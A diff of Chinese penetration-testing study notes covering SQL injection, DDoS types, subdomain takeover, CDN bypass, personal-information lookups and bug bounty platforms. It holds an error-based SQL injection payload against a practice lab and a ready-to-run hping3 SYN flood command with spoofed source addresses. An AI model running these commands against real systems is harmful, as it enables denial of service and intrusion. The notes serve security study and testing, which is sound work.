-/pikachu/vul/sqli/sqli_del.php?id=56+or+extractvalue+(1,concat(0x7e,database()))
+#### 报错回显
 
 ##### bool类型注入
 
@@ -3118,7 +2955,7 @@ select * from user where username='reborn'='' and password='reborn'=''
 
 
 
-### sql注入过程：手工/sqlmap
+### sql注入过程：sqlmap
 使用sqlmap 步骤是：
 
 ```python
@@ -3187,18 +3024,6 @@ sqlmap在发送请求数据包中user-agent直接申明自己名号，很多防�
 
 也只有是root权限你才可以去查询数据库名即show schemata ，而前面的show databases()查询的是当前数据库，这不满足我们的需求
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705180515958.png)
-
-### 文件读取与写入
-
-**读取**
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705181705882.png)
-具体搜索关键字 常见load_file读取敏感信息.
-这里要想使用得好这个函数，你需要结合我前面写的‘路径读取’来达到效果
-
-**写入**
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210705183450890.png)
-
-写入需要结合前文所描述的后门怎么制作达到最好效果。
 
 
 
@@ -3694,47 +3519,46 @@ ftp://对方内网ip:21
 
 
 ## DDOS 攻击
-常见的方案是通过耗尽目标对象资源来达到攻击效果。
-
-### 攻击过程
+常见的方案是通过耗尽目标对象资源来达到攻击效果,攻击类型与扫描方法类似
 
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200010553.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200048461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200109307.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200144538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200129431.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200201478.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200219526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210515200318819.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 #### DDOS 攻击手段
 
 1）TCP
-
->可见客户端一直没有给服务器端发送ACK报文，而是一直不断地向服务器端发送连接请求，导致服务端忙于处理批量的连接请求，而没有空余资源可以处理其他正常用户的访问，导致服务器瘫痪。
+客户端一直没有给服务器端发送ACK报文，而是一直不断地向服务器端发送连接请求，导致服务端忙于处理批量的连接请求
 
 2）UDP
+向目标端口发送大量无用的UDP报文来占满目标的带宽，导致目标服务器瘫痪。
 
->向目标端口发送大量无用的UDP报文来占满目标的带宽，导致目标服务器瘫痪。
->
->3）HTTP
->主要攻击目标是使用https协议的Web服务器上的访问服务，当发生攻击时攻击者向被攻击服务器大量高频的发送请求服务，使服务器忙于向攻击者提供https响应资源从而导致不能想正常的合法用户提供请求响应服务。
+3）HTTP
+客户端产生大量http访问请求 
 
 4）ICMP
 
->ICMP是（Internet Control Message Protocol，网络控制报文协议 ） 该攻击在短时间内向目标主机发送大量ping请求包，消耗主机资源，当目标系统响应攻击者发出的大量的  ping请求超出系统的最大承受限度时，目标系统资源就会耗尽殆尽，造成系统瘫痪或者无法正常提供其他服务。 目前使用ICMP洪水进行DoS攻击的情况已不多见，如图所示，攻击者在对目标进行ICMP洪水攻击时，100%ICMP包丢失，说明目标一个ICMP包都没有接收，这是因为现在大多数防火墙都已经设置ICMP包过滤机制，使得攻击者发起的ICMP洪水在目标网络边界就已经被过滤并丢弃，导致攻击无效。
+大量ping请求
 
 5)SYN
+发送大量无情的SYN包。
+如下是攻击代码
+-S 表示发送的是SYN包
+–flood 表示以洪水的方式发送，就是拼了命地发
+–rand-source 是随机伪造源IP
+-p 80 指定端口号为80
+```bash
+hping3 -S -U --flood -p 80 --rand-source IP
+```
 
->SYN攻击利用的是TCP的三次握手机制，攻击端利用伪造的IP地址向被攻击端发出请求，而被攻击端发出的响应 报文将永远发送不到目的地，那么被攻击端在等待关闭这个连接的过程中消耗了资源，如果有成千上万的这种连接，主机资源将被耗尽，从而达到攻击的目的。
+## 待补充：劫持漏洞
+### DNS劫持
+DNS 记录指向的资源无效，但记录本身尚未从 DNS 清除，攻击者可以借此实现 DNS 劫持。 
+帮助检测DNS工具有：
+tko-subs
+HostileSubBruteforcer
+autoSubTakeover
+### HTTP劫持
 
-
-
-
-
+### DLL劫持
 # 经验积累
 
 
@@ -4534,9 +4358,7 @@ https://www.feiliuwl.cn/go/?url=http://qb-api.com/ 或者 https://qb-api.com   �
 
 
 这个网站找到电话也可以 https://pig8.iculture.cc/
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701170650470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
-![在这里插入图片描述](https://img-blog.csdnimg.cn/20210701170520497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L25nYWRtaW5x,size_16,color_FFFFFF,t_70)
 
 #### 已知名字
 
@@ -4677,9 +4499,9 @@ qq点找回密码，其他与前文已知邮箱操作相同
 https://www.iculture.cc/pizzahut
 
 ## 绕过CDN
-
-**简要介绍**
-试图获取真实ip,对于中小型网站这是简单的，对于大型如百度、腾讯这是几乎不能成功的。小型网站可以尝试用nslookup来查询ip，若返回域名解析结果为多个ip，多半使用了CDN，是不真实的ip。
+试图获取真实ip,对于中小型网站这是简单的，对于大型如百度、腾讯这是几乎不能成功的。
+**有CDN吗**
+小型网站可以尝试用nslookup来查询ip，若返回域名解析结果为多个ip，多半使用了CDN，是不真实的ip。
 或者你通过多地ping看返回的ip是否一样来验证是不是有CDN。这个在站长之家的超级ping工具可以获得显示 http://ping.chinaz.com 使用此工具的时候注意你输入ww.XXX.com与XXX.com解析结果很可能是不同的。这取决于管理员对网站的设置。
 如下是ww.XXX.com
 ![在这里插入图片描述](https://img-blog.csdnimg.cn/20210629153333683.png)
@@ -6031,16 +5853,12 @@ OWASP亚洲峰会
 关注最新爆出来的网站漏洞，有EXP的直接利用exp；假设你发现dedecms爆出最新漏洞，你就利用网络空间搜索如edu.cn & dedecms。
 ****
 网址：
-女娲补天 https://nvwa.org/index_zh.php
 漏洞盒子 https://www.vulbox.com/projects/list
 难度：难
 范围：窄，仅限挂名的网站
 奖赏：中
 审核：周六日不上班；审核机制审核一般在1-3个工作日，那么漏洞盒子自动确认漏洞并且得到积分的时间需要1-11天，在第十一天就会确定此漏洞
 思路：
-直接上扫描工具：AWVS，xray等;
-关注最新爆出来的网站漏洞，有EXP的直接利用exp；假设你发现dedecms爆出最新漏洞，你就利用网络空间搜索如edu.cn & dedecms。
-
 
 **经验**
 在挖漏洞一定要写清楚细节，对于中高危最好录个像。
